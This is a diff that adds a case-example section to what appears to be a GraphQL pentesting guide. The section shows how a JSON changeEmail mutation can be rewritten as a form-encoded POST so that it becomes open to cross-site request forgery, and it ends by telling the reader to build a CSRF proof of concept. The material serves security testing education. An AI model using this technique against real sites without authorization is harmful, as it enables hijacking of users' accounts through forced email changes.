@@ -1114,6 +1114,37 @@ If the endpoint accepts GraphQL queries via `GET`, an attacker doesn't even need
 
 ---
 
+## 7.1 - Case example
+
+We have this normal POST request to change email as follow:
+```
+POST /graphql/v1 HTTP/2
+Host: ...something...
+Cookie: session=...something...; session=...something...
+Content-Type: application/json
+
+{"query":"mutation changeEmail($input:ChangeEmailInput!){changeEmail(input:$input){email}}\n","operationName":"changeEmail","variables":{"input":{"email":"asd@asd.com"}}}
+```
+
+1. First, we convert the request into a POST request with a `Content-Type` of `x-www-form-urlencoded`
+2. Break the original `request body` into arguments and craft new one base on it.
+3. New request should look like this:
+
+```
+POST /graphql/v1 HTTP/2
+Host: ...something...
+Cookie: session=...something...; session=...something...
+Content-Type: application/x-www-form-urlencoded
+
+
+query=mutation+changeEmail($input:ChangeEmailInput!){changeEmail(input:$input){email}}&operationName=changeEmail&variables={"input":{"email":"qwe@asd.com"}}
+```
+
+Here, the arguments from original request body are: `query`, `operationName` and `variables`. Test, troubleshoot and generate a CSRF POC.
+
+
+---
+
 # 8. Tools of trade
 
 ## 8.1 - graphw00f
